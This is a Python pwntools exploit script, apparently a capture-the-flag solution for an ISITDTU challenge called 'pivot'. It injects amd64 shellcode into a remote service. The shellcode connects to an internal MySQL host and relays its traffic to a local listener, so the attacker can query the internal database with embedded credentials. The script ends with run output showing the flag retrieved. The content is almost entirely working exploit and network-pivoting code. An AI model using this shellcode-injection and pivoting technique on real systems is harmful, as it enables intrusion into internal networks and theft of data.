from pwn import *
import time
import sys, os
context.arch = 'amd64'
def pivot(DEBUG):
    if DEBUG=='1':
        r = process('./pivot')
        # raw_input('debug?')
    elif DEBUG=='2':
        HOST = '34.126.117.161'
        PORT = 9999
        r = remote(HOST,PORT)
    
    log.info("Run command: mysql --skip-ssl -h localhost -P 33066 -u isitdtu --password=qp37RWf@@Ygvd@ fl4g -e 'select * from fl4g'")
    l = listen(33066)

    def server_read():
        log.info("server_read")
        data = l.recv(0x500)
        r.send(data)
        return data
    
    def server_write():
        log.info("server_write")
        data = r.recv(0x500)
        l.send(data)
        return data
    
    def shell_server2client():
        shell = pwnlib.shellcraft.amd64.linux.read('rbp', 'r10', 0x500)
        shell += pwnlib.shellcraft.amd64.linux.write(1, 'r10', 'rax')
        return shell

    def shell_client2server():
        shell = pwnlib.shellcraft.amd64.linux.read(0, 'r10', 0x500)
        shell += pwnlib.shellcraft.amd64.linux.write('rbp', 'r10', 'rax')
        return shell
    
    def gen_shellcode():
        host = '10.10.10.3'
        port = 3306
        shellcode = asm(
        """
        push 0x404108
        pop r10
        """ +
        pwnlib.shellcraft.amd64.linux.connect(host, port) +
        shell_server2client()+
        shell_client2server()+
        shell_server2client()+
        """
        cmp byte ptr [r10+5], 0x3
        je s2c
        loop:
        """+
        shell_client2server()+
        """
        s2c:
        """+
        shell_server2client()+
        """
        jmp loop
        """
        )
        return shellcode

    def py_read_write():
        server_write()
        server_read()
        data = server_write()
        if data[5] == 3:
            log.info("plaintext")
            server_write()
        else:
            log.info("pubkey")
        
        while 1:
            data = server_read()
            if data == b'\x01\x00\x00\x00\x01':
                log.info("Done")
                exit()
            server_write()

    shellcode = gen_shellcode()
    r.recv(10)
    
    _ = l.wait_for_connection()
    r.send(shellcode)
    py_read_write()
    r.interactive()

pivot(sys.argv[1])
"""
$ python pivot.py 2
[+] Opening connection to 34.126.117.161 on port 9999: Done
[*] Run command: mysql --skip-ssl -h localhost -P 33066 -u isitdtu --password=qp37RWf@@Ygvd@ fl4g -e 'select * from fl4g'
[+] Trying to bind to :: on port 33066: Done
[+] Waiting for connections on :::33066: Got connection from ::ffff:127.0.0.1 on port 35620
[*] server_write
[*] server_read
[*] server_write
[*] plaintext
[*] server_write
[*] server_read
[*] server_write
[*] server_read
[*] Done
[*] Closed connection to ::ffff:127.0.0.1 port 35620
[*] Closed connection to 34.126.117.161 port 9999

$ mysql --skip-ssl -h localhost -P 33066 -u isitdtu --password=qp37RWf@@Ygvd@ fl4g -e 'select * from fl4g'
+--------------------------------------+
| flag                                 |
+--------------------------------------+
| ISITDTU{piv0t_i5_n0T_v3ry_diFficUlT} |
+--------------------------------------+
"""